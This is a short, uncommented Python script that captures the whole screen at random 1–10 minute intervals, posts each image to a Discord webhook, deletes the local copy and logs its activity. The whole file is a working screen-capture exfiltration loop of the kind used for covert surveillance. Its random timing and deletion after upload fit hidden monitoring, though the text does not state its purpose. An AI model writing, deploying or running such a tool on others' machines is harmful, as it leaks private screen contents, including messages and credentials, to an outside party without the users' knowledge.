import os
import time
import random
import requests
import logging
from datetime import datetime
from PIL import ImageGrab
from logging.handlers import RotatingFileHandler

# Configuration
WEBHOOK_URL = 'your_discord_webhook_url'  # Replace with your Discord webhook URL
MIN_INTERVAL = 60  # Minimum interval in seconds
MAX_INTERVAL = 600  # Maximum interval in seconds
DELETE_AFTER_SEND = True  # Whether to delete the screenshot file after sending

# Configure logging with rotation
log_handler = RotatingFileHandler('screenshot_tool.log', maxBytes=5e6, backupCount=5)
log_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
log_handler.setFormatter(log_formatter)
logging.getLogger().addHandler(log_handler)
logging.getLogger().setLevel(logging.INFO)

def take_screenshot():
    screenshot = ImageGrab.grab()
    filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
    screenshot.save(filename)
    logging.info(f"Screenshot taken and saved as {filename}")
    return filename

def send_to_discord(filename):
    with open(filename, 'rb') as file:
        response = requests.post(WEBHOOK_URL, files={'file': file})
    if response.status_code == 200:
        logging.info(f"Successfully sent {filename} to Discord")
    else:
        logging.error(f"Failed to send {filename} to Discord: {response.status_code} - {response.text}")
    logging.info(f"Screenshot {filename} processed.")

def get_dynamic_interval():
    # For example, return a fixed value or use some logic
    return random.randint(MIN_INTERVAL, MAX_INTERVAL)

def main():
    while True:
        try:
            filename = take_screenshot()
            send_to_discord(filename)
            if DELETE_AFTER_SEND:
                os.remove(filename)
                logging.info(f"Deleted screenshot file {filename}")
        except Exception as e:
            logging.error(f"An error occurred: {e}")

        sleep_time = get_dynamic_interval()
        logging.info(f"Sleeping for {sleep_time} seconds")
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()